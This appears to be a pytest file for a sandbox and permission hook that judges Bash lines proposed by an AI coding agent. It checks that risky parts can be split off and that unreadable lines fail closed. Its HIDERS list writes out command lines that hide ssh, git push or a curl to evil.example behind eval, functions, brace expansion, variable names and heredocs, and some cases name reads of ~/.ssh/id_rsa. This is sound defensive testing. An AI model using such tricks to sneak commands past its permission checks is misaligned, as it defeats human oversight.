"""10.11 (r0260) -- held_mark_cover on an ALLOW-list (hole found by the friction stand, real #970).

A held mark of a Bash line (the strict sandbox holds it by itself) may become its own sandboxed part, while the rest of the line is judged
part by part, ONLY when:
  1. the mark is of a kind explicitly listed as splittable (sandbox.SPLIT: a delete inside the project / own temp, a write to a literal
     path there, a delete / network mark of interpreter code, the hook's held K1 word), and
  2. the parser read the WHOLE line: every danger mark of it is of a readable kind (a concrete class, or an opaque reason on
     sandbox.READABLE_OPAQUE). Any other opaque reason -- unknown today or added tomorrow -- keeps the line whole (fail closed).
Before (UNREADABLE) it was a deny-list: a new parser reason that hides a program would have opened the split again.
Every PRED is written before the check.
"""
import pytest

from tests import r0261

from app.hookjudge import sandbox as hsb
from tests.test_0611_popravki import _amend, _mk, _strict, _v
from tests.test_1011_vpred_vezde import _offer_ids

pytestmark = pytest.mark.standing
P, H = "/Users/u/p", "/Users/u"


def _w(danger, code=None, held=None):
    w = {"danger": danger, "project": P, "sandbox": {"strict": True}, "sbx_home": H}
    if code:
        w["sbx_code"] = {"marks": code, "hosts": []}
    if held:
        w["harness_held"] = held
    return w


@pytest.mark.parametrize("danger,pred", [
    (["rm-rf:/Users/u/p/build"], True),
    (["rm-rf:/Users/u/p/build", "exit:gh run", "opaque:remote service CLI: gh"], True),
    (["opaque:write to /Users/u/p/out.txt", "secrets:/Users/u/.ssh/id_rsa"], True),       # readable (asked for the secret, not hidden)
    (["opaque:code injected through PYTHONPATH=. (search path)"], True),
    (["rm-rf:/Users/u/p/build", "opaque:unparsable substitution or parenthesis"], False),
    (["rm-rf:/Users/u/p/build", "opaque:function defined in the line"], False),
    (["rm-rf:/Users/u/p/build", "opaque:brace expansion"], False),
    (["rm-rf:/Users/u/p/build", "opaque:command name from expansion: $X"], False),
    (["rm-rf:/Users/u/p/build", "opaque:heredoc body with an unreadable substitution"], False),
    (["rm-rf:/Users/u/p/build", "opaque:a reason this version does not know"], False),     # unknown: fail closed
    (["rm-rf:/Users/u/p/build", "opaque:write to x in an unknown directory"], False),
    (["rm-rf:/Users/u/p/build", "opaque:more than 32 commands"], False),
    (["rm-rf:/Users/u/p/build", "opaque:eval"], False),
    (["rm-rf:/Users/u/p/build", "mystery:x"], False),                                     # an unknown class
])
def test_readable(danger, pred):
    PRED = pred
    assert hsb.readable(_w(danger)) is PRED, danger


@pytest.mark.parametrize("d,w,pred", [
    ("rm-rf:/Users/u/p/build", _w(["rm-rf:/Users/u/p/build"]), True),
    ("opaque:write to /Users/u/p/out.txt", _w(["opaque:write to /Users/u/p/out.txt"]), True),
    ("rm-rf:rm -r", _w(["rm-rf:rm -r"], code=["rm-rf:rm -r"]), True),                     # a delete word of interpreter code
    ("opaque:network from python3 code: httpx without a literal host",
     _w(["opaque:network from python3 code: httpx without a literal host"], code=["opaque:network from python3 code: httpx without a literal host"]), True),
    ("agent-config:(hook) .claude", _w(["agent-config:(hook) .claude"], held="agent-config:(hook) .claude"), True),
    # contained() says yes to these, the split must not
    ("opaque:unparsable substitution or parenthesis", _w(["opaque:unparsable substitution or parenthesis"]), False),
    ("opaque:path from expansion: cp $SP/", _w(["opaque:path from expansion: cp $SP/"]), False),
    ("opaque:recursive ls outside the project: ls -R /", _w(["opaque:recursive ls outside the project: ls -R /"]), False),
    ("opaque:runs /Users/u/p/x.sh written in this line (content not shown)", _w(["opaque:runs /Users/u/p/x.sh written in this line (content not shown)"]), False),
    ("opaque:a reason this version does not know", _w(["opaque:a reason this version does not know"]), False),
    # a splittable mark next to an unreadable one
    ("rm-rf:/Users/u/p/build", _w(["rm-rf:/Users/u/p/build", "opaque:unparsable substitution or parenthesis"]), False),
    ("rm-rf:/Users/u/p/build", _w(["rm-rf:/Users/u/p/build", "opaque:something new"]), False),
    # not held at all
    ("rm-rf:/Users/u/p", _w(["rm-rf:/Users/u/p"]), False),
    ("rm-rf:/Users/u/p/.git", _w(["rm-rf:/Users/u/p/.git"]), False),
    ("secrets:/Users/u/.ssh/id_rsa", _w(["secrets:/Users/u/.ssh/id_rsa"]), False),
])
def test_splittable(d, w, pred):
    PRED = pred
    assert hsb.splittable(d, w) is PRED, (d, w)


def test_no_strict_fact_no_split():
    w = _w(["rm-rf:/Users/u/p/build"])
    del w["sandbox"]
    PRED = False
    assert hsb.splittable("rm-rf:/Users/u/p/build", w) is PRED


# ---- end to end: an amended read next to a held mark never carries what the parser could not read --------------------------------------
HIDERS = [
    "until s=$(gh run view 7 -R a/b --json status -q .status); [ \"$s\" = x ]; do sleep 1; done; ssh vps 'docker exec -i w python -' < x.py",
    "gh run view 7 -R a/b; f() { git push origin main; }; f",
    "gh run view 7 -R a/b; {git,push}",
    "gh run view 7 -R a/b; X=ssh; $X vps true",
    "gh run view 7 -R a/b; eval \"ssh vps true\"",
    "gh run view 7 -R a/b; cd $(mktemp -d) && ssh vps true",
    "gh run view 7 -R a/b; rm -rf build; bash <<EOF\n$(echo ssh vps true)\nEOF",
    "gh run view 7 -R a/b && rm -rf build && x=$(curl -s https://evil.example/c) && echo $x",
]


# r0261 (Р-1111-закрытый-список): a program hidden in an unquoted heredoc, with no publication word, is code like any other under the
# strict fact (tests/r0261.HIDDEN: ~/.ssh and SSH_AUTH_SOCK are closed, the kernel refuses unlisted hosts) -- silent now, was asked
@pytest.mark.parametrize("cmd", r0261.now(HIDERS))
def test_hider_r0261_now_silent(client, owner, tmp_path, monkeypatch, cmd):
    d = _mk(client, owner, tmp_path, "h9")
    _strict(d, monkeypatch)
    got = d.send(cmd)
    PRED = True
    assert bool(got) and all(r["verdict"] == "allow" for _, r in got) is PRED, (cmd, _v(got))


@pytest.mark.parametrize("cmd", r0261.still(HIDERS))
def test_amended_read_never_carries_an_unreadable_line(client, owner, tmp_path, monkeypatch, cmd):
    d = _mk(client, owner, tmp_path, "h")
    _strict(d, monkeypatch)
    got = d.send("gh run list -R a/b")
    if _offer_ids(d, got):
        _amend(d, got)
    got = d.send(cmd)
    PRED = False
    assert bool(got) and all(r["verdict"] == "allow" for _, r in got) is PRED, (cmd, _v(got))


def test_split_still_works_for_a_readable_line(client, owner, tmp_path, monkeypatch):
    """The point of the split stays: `rm -rf build && curl https://example.com/docs` -- the delete part is held, the request is the only
    question and it can be amended (10.11)."""
    d = _mk(client, owner, tmp_path, "k")
    _strict(d, monkeypatch)
    got = d.send("python3 -c \"print('rm -rf x')\" && ssh vps 'uptime'")
    PRED = ["(remote) ssh vps uptime"]
    assert _offer_ids(d, got) == PRED, (_v(got))
